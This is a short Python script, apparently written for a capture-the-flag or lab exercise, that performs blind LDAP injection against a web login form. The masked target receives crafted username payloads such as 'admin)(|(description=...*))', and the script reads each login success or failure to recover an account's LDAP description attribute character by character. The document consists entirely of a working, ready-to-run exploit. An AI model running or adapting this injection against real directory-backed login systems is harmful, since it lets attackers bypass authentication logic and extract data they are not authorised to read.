import requests
from urllib.parse import quote

# Target URL and credentials
TARGET_URL = "http://*.*.*.*:****"
USERNAME = "admin"
PASSWORD = "invalid"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

# Characters to test for brute-forcing
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@!#$%^&*()-_=+{}[]|;:'\"<>,.?/"

def check_response(payload):
    """Send a request with the payload and analyze the response."""
    data = f"username={payload}&password={PASSWORD}"
    response = requests.post(TARGET_URL, headers=HEADERS, data=data)

    # Analyze the response (adjust based on observed behavior)
    return "successful login" in response.text.lower()

def extract_description():
    """Extract the description attribute character by character."""
    description = ""
    position = 1

    while True:
        found = False
        for char in CHARSET:
            # Construct payload
            payload = (
                f"{USERNAME})(|(description={description}{char}*))"
            )
            payload_encoded = quote(payload)

            # Check if this character is correct
            if check_response(payload_encoded):
                description += char
                found = True
                print(f"[+] Found character: {char} => {description}")
                break

        if not found:
            print("[!] No more characters found. Extraction complete.")
            break

    return description

if __name__ == "__main__":
    print("[+] Starting LDAP Blind Injection Script")
    extracted_description = extract_description()
    print(f"[+] Extracted Description: {extracted_description}")
